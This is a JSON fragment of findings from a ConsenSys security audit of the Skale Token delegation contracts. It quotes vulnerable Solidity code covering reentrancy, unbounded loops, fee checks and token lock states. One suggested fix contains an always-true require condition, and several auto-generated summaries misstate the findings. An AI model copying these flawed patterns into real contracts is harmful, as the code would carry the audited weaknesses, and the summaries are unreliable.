      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13840",
      "title": "Lack of logs and events on state changes Â Pending",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nSkale team acknowledged this issue and will address this in future versions, but given the minor level and need to begin remediation, itâ€™s left out of scope from the re-mediation tag.\n\n\n#### Description\n\n\nEvents in Solidity are used to log major state changes in the system, as for tracebility and also trigger UI changes or user notifications. It is a good practice to use events for every value storage change to be able to trace back the system.\n\n\n#### Recommendation\n\n\nemit events whenever a state change happens. As an example slashing does not emit any events and cannot notify a user unless a service is polling the system state regularly.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13839",
      "title": "Validator should be able to remove delegator âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nCode added in [SKALE-2162](https://github.com/skalenetwork/skale-manager/pull/107), If the delegation is not in `DELEGATED` state, both validator and the delegator can request `undelegation`.\n\n\n#### Description\n\n\nIn order to delegate tokens to a validator, the validator should accept the delegation request, however itâ€™s not possible to remove the delegator for the next period.\n\n\n#### Recommendation\n\n\nFor consistency, either allow a validator to `undelegate` delegators for the next period or remove acceptance mechanism if itâ€™s not needed.",
      "summary": "\nThis bug report is about a situation where a validator cannot remove a delegator for the next period. The code added in SKALE-2162 allows both the validator and the delegator to request an undelegation, provided the delegation is not in the 'DELEGATED' state. The recommendation is that either the validator should be allowed to undelegate delegators for the next period, or the acceptance mechanism should be removed if it is not needed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13838",
      "title": "tokenState.setState redundant checks âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\n`tokenState.setState` is used to change the state of the token from:\n\n\n* PROPOSED to ACCEPTED (in `accept()`)\n* DELEGATED to ENDING\\_DELEGATED (in `requestUndelegation()`\n\n\nThe if/else statement in `setState` is too complicated and can be simplified, both to optimize gas usage and to increase readability.\n\n\n#### Examples\n\n\n**code/contracts/delegation/TokenState.sol:L173-L197**\n\n\n\n```\nfunction setState(uint delegationId, State newState) internal {\n    TimeHelpers timeHelpers = TimeHelpers(contractManager.getContract(\"TimeHelpers\"));\n    DelegationController delegationController = DelegationController(contractManager.getContract(\"DelegationController\"));\n\n    require(newState != State.PROPOSED, \"Can't set state to proposed\");\n\n    if (newState == State.ACCEPTED) {\n        State currentState = getState(delegationId);\n        require(currentState == State.PROPOSED, \"Can't set state to accepted\");\n\n        \\_state[delegationId] = State.ACCEPTED;\n        \\_timelimit[delegationId] = timeHelpers.getNextMonthStart();\n    } else if (newState == State.DELEGATED) {\n        revert(\"Can't set state to delegated\");\n    } else if (newState == State.ENDING\\_DELEGATED) {\n        require(getState(delegationId) == State.DELEGATED, \"Can't set state to ending delegated\");\n        DelegationController.Delegation memory delegation = delegationController.getDelegation(delegationId);\n\n        \\_state[delegationId] = State.ENDING\\_DELEGATED;\n        \\_timelimit[delegationId] = timeHelpers.calculateDelegationEndTime(delegation.created, delegation.delegationPeriod, 3);\n        \\_endingDelegations[delegation.holder].push(delegationId);\n    } else {\n        revert(\"Unknown state\");\n    }\n}\n\n```\n#### Recommendation\n\n\nSome of the changes that do not change the functionality of the `setState` function:\n\n\n* Remove `reverts()` and add the valid states to the `require()` at the beginning of the function\n* Remove multiple calls to `getState()`\n* Remove final else/revert as this is an internal function and States passed should be valid\nMore optimization can be done which requires further understanding of the system and the state machine.\n\n\n\n```\nfunction setState(uint delegationId, State newState) internal {\n        TimeHelpers timeHelpers = TimeHelpers(contractManager.getContract(\"TimeHelpers\"));\n        DelegationController delegationController = DelegationController(contractManager.getContract(\"DelegationController\"));\n\n        require(newState != State.PROPOSED || newState != State.DELEGATED, \"Invalid state change\");\n        State currentState = getState(delegationId);\n\n        if (newState == State.ACCEPTED) {\n            require(currentState == State.PROPOSED, \"Can't set state to accepted\");\n\n            \\_state[delegationId] = State.ACCEPTED;\n            \\_timelimit[delegationId] = timeHelpers.getNextMonthStart();\n        } else if (newState == State.ENDING\\_DELEGATED) {\n            require(currentState == State.DELEGATED, \"Can't set state to ending delegated\");\n            DelegationController.Delegation memory delegation = delegationController.getDelegation(delegationId);\n\n            \\_state[delegationId] = State.ENDING\\_DELEGATED;\n            \\_timelimit[delegationId] = timeHelpers.calculateDelegationEndTime(delegation.created, delegation.delegationPeriod, 3);\n            \\_endingDelegations[delegation.holder].push(delegationId);\n        }\n    }\n\n```",
      "summary": "\nA bug was reported regarding the function `tokenState.setState` which is used to change the state of the token from PROPOSED to ACCEPTED and DELEGATED to ENDING_DELEGATED. The if/else statement in this function was too complicated and could be simplified to optimize gas usage and increase readability. The resolution for this bug was code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92). The changes included removing reverts and adding valid states to the require at the beginning of the function, removing multiple calls to getState, and removing the final else/revert. This was done to not change the functionality of the `setState` function and to optimize gas usage and increase readability. Further optimization can be done with further understanding of the system and the state machine.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13837",
      "title": "Some functions are defined but not implemented âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed by removing the empty functions and implementing some others in [SKALE-2160](https://github.com/skalenetwork/skale-manager/pull/113). At the time of the writing this comment, the review has not been comprehensive to all functions in the scope.\n\n\n#### Description\n\n\nThere are many functions that are defined but not implemented. They have a revert with a message as not implemented.\n\n\nThis results in complex code and reduces readability. Here is a some of these functions within the scope of this audit:\n\n\n* DelegationService.setMinimumStakingRequirement()\n* DelegationService.getAllDelegationRequests()\n* DelegationService.getDelegationRequestsForValidator()\n* DelegationService.listDelegationRequests()\n* DelegationService.getDelegationRequestsForValidator()\nMany more functions in `DelegationService.sol`\n\n\n#### Examples\n\n\n**code/contracts/delegation/DelegationService.sol:L152-L158**\n\n\n\n```\nfunction getAllDelegationRequests() external returns(uint[] memory) {\n    revert(\"Not implemented\");\n}\n\nfunction getDelegationRequestsForValidator(uint validatorId) external returns (uint[] memory) {\n    revert(\"Not implemented\");\n}\n\n```\n#### Recommendation\n\n\nIf these functions are needed for this release, they must be implemented. If they are for future plan, itâ€™s better to remove the extra code in the smart contracts.",
      "summary": "\nThis bug report is about functions in the DelegationService.sol file that are defined but not implemented. This results in complex code and reduces readability. Examples of these functions are getAllDelegationRequests(), getDelegationRequestsForValidator(), and listDelegationRequests(). To fix this issue, the empty functions were removed and some others were implemented in SKALE-2160. It is recommended that if these functions are needed for this release, they must be implemented. If they are for future plans, it is better to remove the extra code in the smart contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13836",
      "title": "_endingDelegations list is redundant âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\n`_endingDelegations` is a list of delegations that is created for optimisation purposes.\nBut the only place itâ€™s used is in `getPurchasedAmount` function, so only a subset of all delegations is going to be updated.\n\n\n**code/contracts/delegation/TokenState.sol:L159-L164**\n\n\n\n```\nfunction getPurchasedAmount(address holder) public returns (uint amount) {\n    // check if any delegation was ended\n    for (uint i = 0; i < \\_endingDelegations[holder].length; ++i) {\n        getState(\\_endingDelegations[holder][i]);\n    }\n    return \\_purchased[holder];\n\n```\nBut `getPurchasedAmount` function is mostly used after iterating over all delegations of the holder.\n\n\n#### Recommendation\n\n\nRemove `_endingDelegations` and switch to a mechanism that does not require looping through delegations list of potentially unlimited size.",
      "summary": "\nA bug was identified in the code of the TokenState.sol contract which caused a subset of all delegations to not be updated. This bug was fixed as a part of the major code changes in skalenetwork/skale-manager#92. The bug was caused by the `_endingDelegations` list which was created for optimization purposes, but was only used in the `getPurchasedAmount` function. This function was mostly used after iterating over all delegations of the holder, meaning a subset of all delegations were not being updated. The recommended resolution was to remove the `_endingDelegations` list and switch to a mechanism that does not require looping through a potentially unlimited size delegations list.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13835",
      "title": "getState changes state implicitly âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\n`getState` function is checking and changing the state of a delegation struct. This function is called in many places in the codebase. Every delegation has a lot of different possible states and all of them are changed implicitly during other transactions, which makes it hard to track the logic in the code and make future changes in the code close to impossible without breaking some functionalities.\n\n\n#### Recommendation\n\n\nThe general suggestion would be to minimize the number of implicit storage changes. Many states can be either changed explicitly or be calculated without additional storage changes.\n\n\nAs an option, itâ€™s possible to get rid of state storage slot at all. `startDate` and `endDate` fields may set the current state:\n\n\n* `initProposed` can be called during the creation of the proposal.\n* no need to explicitly change states between `ACCEPTED` and `DELEGATED`, you can set the start date on acceptance and no further changes are required.\n* no need to switch states between `DELEGATED` and `ENDING_DELEGATED`, when delegation is set to end, itâ€™s fine to just have `end_date` storage slot and make assign the date there when `undelegate` function is called.\n* unlocking funds from delegation (or not accepted request) can be explicit.\n\n\nAlso see [issue 5.19](#tokenstatesetstate-redundant-checks) for other suggestions regarding `getState` usage in the code",
      "summary": "\nThis bug report is about the `getState` function which is used in many places in the codebase and is responsible for checking and changing the state of a delegation struct. This function has many different possible states which are changed implicitly during other transactions, making it hard to track the logic in the code and difficult to make future changes without breaking some functionalities.\n\nThe recommendation is to minimize the number of implicit storage changes. Many states can be either changed explicitly or be calculated without additional storage changes. An option is to get rid of the state storage slot altogether. The `startDate` and `endDate` fields can be used to set the current state. `initProposed` can be called during the creation of the proposal and the start date can be set on acceptance without requiring a state change. When the delegation is set to end, the `end_date` storage slot can be assigned and the funds can be unlocked from the delegation explicitly.\n\nThe issue was fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92). For other suggestions regarding the `getState` function, see [issue 5.19](#tokenstatesetstate-redundant-checks).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13834",
      "title": "Fees can be > 100% âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAdded a check to prevent fee rates equal or higher than 100% in [SKALE-2157-fee-check](https://github.com/skalenetwork/skale-manager/pull/104).\n\n\n#### Description\n\n\nA validator can be created with `feeRate > 1000` which would mean that the fee rate would be higher than 100%. Severity is not high because that validator will most likely be not whitelisted.\n\n\nAlso, 100%+ fees would still somehow work and not revert because of the absence of `SafeMath`.\n\n\n#### Recommendation\n\n\nAdd sanity check for the input values in `registerValidator`, and do not allow adding a validator with a fee rate higher than 100%.",
      "summary": "\nA bug was discovered which would allow a validator to be created with a fee rate higher than 100%. This would mean that the validator would not be whitelisted, but the fees would still work due to the absence of SafeMath. To solve this issue, a check was added to the Skale-Manager to prevent fee rates equal or higher than 100%. Furthermore, it was recommended to add a sanity check for the input values in the registerValidator, to make sure that no validator with a fee rate higher than 100% can be added.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13833",
      "title": "Disabled Validators still have delegated funds Â Pending",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nSkale team acknowledged this issue and will address this in future versions.\n\n\n#### Description\n\n\nThe owner of `ValidatorService` contract can enable and disable validators. The issue is that when a validator is disabled, it still has its delegations, and delegated funds will be locked until the end of their delegation period (up to 12 months).\n\n\n**code/contracts/delegation/ValidatorService.sol:L84-L90**\n\n\n\n```\nfunction enableValidator(uint validatorId) external checkValidatorExists(validatorId) onlyOwner {\n    trustedValidators[validatorId] = true;\n}\n\nfunction disableValidator(uint validatorId) external checkValidatorExists(validatorId) onlyOwner {\n    trustedValidators[validatorId] = false;\n}\n\n```\n#### Recommendation\n\n\nIt might make sense to release all delegations and stop validatorâ€™s nodes if itâ€™s not trusted anymore.\nHowever, the rationale behind disabling the validators might be different that what we think, in any case there should be a way to handle this scenario, where the validator is disabled but there are funds delegated to it.",
      "summary": "\nSkale team has identified an issue with their `ValidatorService` contract, which enables and disables validators. When a validator is disabled, it still has its delegations, and the delegated funds will be locked until the end of their delegation period (up to 12 months). It is recommended that a way should be implemented to handle this scenario, where the validator is disabled but there are funds delegated to it. Skale team has acknowledged this issue and will address it in future versions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13832",
      "title": "Delegations might stuck in non-active validator Â Pending",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nSkale team acknowledged this issue and will address this in future versions.\n\n\n#### Description\n\n\nIf a validator does not get enough funds to run a node (`MSR - Minimum staking requirement`), all token holders that delegated tokens to the validator cannot switch to a different validator, and might result in funds getting stuck with the nonfunctioning validator for up to 12 months.\n\n\n#### Example\n\n\n**code/contracts/delegation/ValidatorService.sol:L166**\n\n\n\n```\nrequire((validatorNodes.length + 1) \\* msr <= delegationsTotal, \"Validator has to meet Minimum Staking Requirement\");\n\n```\n#### Recommendation\n\n\nAllow token holders to withdraw delegation earlier if the validator didnâ€™t get enough funds for running nodes.",
      "summary": "\nThis bug report is about the issue that when a validator does not get enough funds to run a node (Minimum Staking Requirement, MSR), all token holders that delegated tokens to the validator cannot switch to a different validator, and might result in funds getting stuck with the nonfunctioning validator for up to 12 months. This is because of the code/contracts/delegation/ValidatorService.sol:L166, which requires that the validator has to meet Minimum Staking Requirement. The Skale team acknowledged this issue and will address this in future versions. The recommendation is to allow token holders to withdraw delegation earlier if the validator didnâ€™t get enough funds for running nodes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13831",
      "title": "Rename functions âœ“Â Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed in [SKALE-2154-naming](https://github.com/skalenetwork/skale-manager/pull/105) by renaming the functions. The functions that are not solely getters and update the state of the smart contract are renamed to have `getAndUpdate` in their names. At the time of the writing this comment, the review has not been comprehensive to all functions in the scope.\n\n\n#### Description\n\n\nThe naming of the functions should reflect their nature, such as functions starting with â€œgetâ€ should be only getters and do not change state. This will result in confusion developments and the implicit state changes might not be noticed.\n\n\nOther than getters, some other function or variable names are misleading.\n\n\n#### Examples\n\n\nThe following functions are a few examples that are named as getters but they change the state.\n\n\n* getState -> updateState\n\t+ getDelegationsTotal\n\t+ getDelegationsForValidator\n\t+ getDelegationsByHolder\n\n\nSome other naming that does not reflect the nature of the functionality:\n\n\n* getPurchasedAmount -> getPurchasedUnlocked\n* tokenState.Sold -> lock\n\n\n#### Recommendation\n\n\nFor functions that get and update variables use `getAndUpdate` naming. Similarly use variable names that reflect the nature of the values they store.",
      "summary": "\nThis bug report is about the incorrect naming of functions and variables in the code of a smart contract. This incorrect naming can lead to confusion for developers, and can cause implicit state changes to go unnoticed. The resolution for this bug was to rename the functions to have `getAndUpdate` in their names, and to rename the variables to better reflect the nature of their values. Examples of the incorrect naming include functions such as `getState` and `getDelegationsTotal` that change the state, and variables such as `tokenState.Sold` and `getPurchasedAmount` that do not reflect the nature of their values. The recommendation is to use `getAndUpdate` naming for functions that get and update variables, and to use variable names that reflect the nature of the values they store.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13830",
      "title": "ERC-777 callback issue âœ“Â Partially fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nreentrancyGaurd was added in [SKALE-2153](https://github.com/skalenetwork/skale-manager/pull/110/files) to `transfer()` and `transferFrom()`. However other functions are still may contain reentrancy bug, such as `burn()`, `send`, etc.\nEven if all the functions in the token contract (even `view` functions like `balanceOf`) have re-entrancy protection, some projects might be still potentially vulnerable to re-entrancy attacks that use callbacks of ERC-777.\n\n\n**UPDATE**: in [skalenetwork/skale-manager#128](https://github.com/skalenetwork/skale-manager/pull/128) `nonReentrant` modifier is now only added to callbacks: `_callTokensToSend`  and `_callTokensReceived`. So far itâ€™s impossible to make balance changes inside of the callbacks because any new balance change also triggers a callback. Therefore, it addresses the issue of re-entrancy by a malicious outside party (non-SKALE). Note since SKALE network retains upgrade capacity of smart contracts. Therefore, itâ€™s potentially possible to do re-entrancy from the `_getAndUpdateLockedAmount` function call, if the corresponding contract is upgraded in a specific way.\n\n\nThis report raises this as an **unfixed minor issue**. This issue will be fixed if the upgrade capability for \\_getAndUpdateLockedAmount() is revoked by SKALE network governance in the future.\n\n\n\n\n#### Description\n\n\nERC-777 token comes with callback functions to the receiver and the sender on every token transfer. This gives re-entrancy opportunities for everyone whoâ€™s using this token. There is a chance that other systems might not handle ERC-777 correctly.\n\n\n#### Examples\n\n\nUniswap reentrancy critical bug: <https://medium.com/consensys-diligence/uniswap-audit-b90335ac007>\n\n\n#### Recommendation\n\n\nUse ERC-20 standard or remove callback function calls.\n\n\nRemove callback function usage from the system and replace them with a standard ERC-20 flow:\n\n\n**code/contracts/delegation/SkaleBalances.sol:L55-L68**\n\n\n\n```\nfunction tokensReceived(\n    address operator,\n    address from,\n    address to,\n    uint256 amount,\n    bytes calldata userData,\n    bytes calldata operatorData\n)\n    external\n    allow(\"SkaleToken\")\n{\n    address recipient = abi.decode(userData, (address));\n    stashBalance(recipient, amount);\n}\n\n```\n**code/contracts/delegation/DelegationService.sol:L275-L289**\n\n\n\n```\nfunction tokensReceived(\n    address operator,\n    address from,\n    address to,\n    uint256 amount,\n    bytes calldata userData,\n    bytes calldata operatorData\n)\n    external\n    allow(\"SkaleToken\")\n{\n    require(userData.length == 32, \"Data length is incorrect\");\n    uint validatorId = abi.decode(userData, (uint));\n    distributeBounty(amount, validatorId);\n}\n\n```",
      "summary": "\nThis bug report focuses on the potential for re-entrancy attacks when using ERC-777 tokens. Re-entrancy is an attack where malicious actors can access code multiple times, allowing them to exploit the code and steal funds. In order to protect against this, reentrancyGaurd was added to the token contract's `transfer()` and `transferFrom()` functions. However, other functions such as `burn()` and `send` may still contain reentrancy bugs. Additionally, even if all the functions in the token contract have re-entrancy protection, some projects might still be vulnerable to re-entrancy attacks that use callbacks of ERC-777. \n\nIn order to address this, the `nonReentrant` modifier was added to the callbacks `_callTokensToSend` and `_callTokensReceived`. This ensures that it is impossible to make balance changes inside of the callbacks, as any new balance change will trigger a callback. \n\nHowever, this issue is still unresolved as it is still potentially possible to do re-entrancy from the `_getAndUpdateLockedAmount` function call, if the corresponding contract is upgraded in a specific way. To fix this issue, the upgrade capability for \\_getAndUpdateLockedAmount() needs to be revoked by SKALE network governance. \n\nAs a recommendation, it is suggested to use ERC-20 standard or remove callback function calls and replace them with a standard ERC-20 flow. This will ensure that code is not vulnerable to re-entrancy attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13829",
      "title": "Gas limit for bounty and slashing distribution âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\nAfter every bounty payment (should be once per month) to a validator, the bounty is distributed to all delegators. In order to do that, there is a `for` loop that iterates over all active delegators and sends their bounty to `SkaleBalances` contract:\n\n\n**code/contracts/delegation/DelegationService.sol:L310-L316**\n\n\n\n```\nfor (uint i = 0; i < shares.length; ++i) {\n    skaleToken.send(address(skaleBalances), shares[i].amount, abi.encode(shares[i].holder));\n\n    uint created = delegationController.getDelegation(shares[i].delegationId).created;\n    uint delegationStarted = timeHelpers.getNextMonthStartFromDate(created);\n    skaleBalances.lockBounty(shares[i].holder, timeHelpers.addMonths(delegationStarted, 3));\n}\n\n```\nThere are also few more loops over all the active delegators. This leads to a huge gas cost of distribution mechanism. A number of active delegators that can be processed before hitting the gas limit is limited and not big enough.\n\n\nThe same issue is with slashing:\n\n\n**code/contracts/delegation/DelegationService.sol:L95-L106**\n\n\n\n```\nfunction slash(uint validatorId, uint amount) external allow(\"SkaleDKG\") {\n    ValidatorService validatorService = ValidatorService(contractManager.getContract(\"ValidatorService\"));\n    require(validatorService.validatorExists(validatorId), \"Validator does not exist\");\n\n    Distributor distributor = Distributor(contractManager.getContract(\"Distributor\"));\n    TokenState tokenState = TokenState(contractManager.getContract(\"TokenState\"));\n\n    Distributor.Share[] memory shares = distributor.distributePenalties(validatorId, amount);\n    for (uint i = 0; i < shares.length; ++i) {\n        tokenState.slash(shares[i].delegationId, shares[i].amount);\n    }\n}\n\n```\n#### Recommendation\n\n\nThe best solution would require major changes to the codebase, but would eventually make it simpler and safer. Instead of distributing and centrally calculating bounty for each delegator during one call itâ€™s better to just store all the necessary values, so delegator would be able to calculate the bounty on withdrawal. Amongst the necessary values, there should be history of total delegated amounts per validator during each bounty payment and history of all delegations with durations of their active state.",
      "summary": "\nThis bug report describes an issue with the codebase of the Skale Manager project, which involves a loop over all active delegators. This loop is used to distribute the bounty payment to all delegators and also to process the slashing of validators. The issue is that the number of active delegators that can be processed before hitting the gas limit is limited and not big enough. To solve the issue, a major code change is recommended. This would involve storing all the necessary values, such as the total delegated amounts per validator during each bounty payment and the history of all delegations with durations of their active state. This would allow delegators to calculate the bounty on withdrawal, instead of having to process it all in one call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13828",
      "title": "Some unlocked tokens can become locked after delegation is rejected âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\nWhen some amount of tokens are requested to be delegated to a validator, the validator can reject the request. The previous status of these tokens should be intact and not changed (locked or unlocked).\n\n\nHere the initial status of tokens gets stored and itâ€™s either completely `locked` or `unlocked`:\n\n\n**code/contracts/delegation/TokenState.sol:L205-L214**\n\n\n\n```\nif (\\_purchased[delegation.holder] > 0) {\n    \\_isPurchased[delegationId] = true;\n    if (\\_purchased[delegation.holder] > delegation.amount) {\n        \\_purchased[delegation.holder] -= delegation.amount;\n    } else {\n        \\_purchased[delegation.holder] = 0;\n    }\n} else {\n    \\_isPurchased[delegationId] = false;\n}\n\n```\nThe problem is that if some amount of these tokens are locked at the time of the request and the rest tokens are unlocked, they will all be considered as locked after the delegation was rejected.\n\n\n**code/contracts/delegation/TokenState.sol:L272-L278**\n\n\n\n```\nfunction \\_cancel(uint delegationId, DelegationController.Delegation memory delegation) internal returns (State state) {\n    if (\\_isPurchased[delegationId]) {\n        state = purchasedProposedToPurchased(delegationId, delegation);\n    } else {\n        state = proposedToUnlocked(delegationId);\n    }\n}\n\n```\n#### Recommendation\n\n\nDonâ€™t change the status of the rejected tokens.",
      "summary": "\nThis bug report is about an issue where tokens requested to be delegated to a validator can be rejected, but the previous status of the tokens (locked or unlocked) is changed. This occurs when the initial status of the tokens is stored as either completely locked or unlocked. The code in question is found in the TokenState.sol file, lines 205-214 and 272-278. The recommendation is to not change the status of the rejected tokens. The issue has been fixed as part of major code changes in skalenetwork/skale-manager#92.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13827",
      "title": "Tokens after delegation should not be unlocked automatically âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\nWhen some amount of tokens are delegated to a validator when the delegation period ends, these tokens are unlocked. However these tokens should be added to `_purchased` as they were in that state before their delegation.\n\n\n**code/contracts/delegation/TokenState.sol:L258-L264**\n\n\n\n```\nif (\\_isPurchased[delegationId]) {\n    address holder = delegation.holder;\n    \\_totalDelegated[holder] += delegation.amount;\n    if (\\_totalDelegated[holder] >= \\_purchased[holder]) {\n        purchasedToUnlocked(holder);\n    }\n}\n\n```\n#### Recommendation\n\n\nTokens should only be unlocked if the main legal requirement `(_totalDelegated[holder] >= _purchased[holder])` is satisfied, which in the above case this has not happened.",
      "summary": "\nThis bug report is about an issue that occurs when tokens are delegated to a validator. When the delegation period ends, the tokens should be added to the `_purchased` state as they were in that state before their delegation. However, this has not been happening. The resolution for this issue is part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92). The recommendation is that tokens should only be unlocked if the main legal requirement `(_totalDelegated[holder] >= _purchased[holder])` is satisfied.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13826",
      "title": "Tokens are unlocked only when delegation ends âœ“Â Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nIssue is fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92)\n\n\n#### Description\n\n\nAfter the first 3 months since at least 50% of tokens are delegated, all tokens should be unlocked. In practice, they are only unlocked if at least 50% of tokens, that were bought on the initial launch, are undelegated.\n\n\n**code/contracts/delegation/TokenState.sol:L258-L264**\n\n\n\n```\nif (\\_isPurchased[delegationId]) {\n    address holder = delegation.holder;\n    \\_totalDelegated[holder] += delegation.amount;\n    if (\\_totalDelegated[holder] >= \\_purchased[holder]) {\n        purchasedToUnlocked(holder);\n    }\n}\n\n```\n#### Recommendation\n\n\nImplement lock mechanism according to the legal requirement.",
      "summary": "\nA bug was reported in the code/contracts/delegation/TokenState.sol file, line 258 to 264. It was discovered that after the first 3 months since at least 50% of tokens are delegated, all tokens should be unlocked. However, in practice, they are only unlocked if at least 50% of tokens, that were bought on the initial launch, are undelegated. This bug has been fixed as a part of the major code changes in [skalenetwork/skale-manager#92](https://github.com/skalenetwork/skale-manager/pull/92). The recommendation is to implement a lock mechanism according to the legal requirement.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Skale Token",
      "source_link": "https://consensys.net/diligence/audits/2020/01/skale-token/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
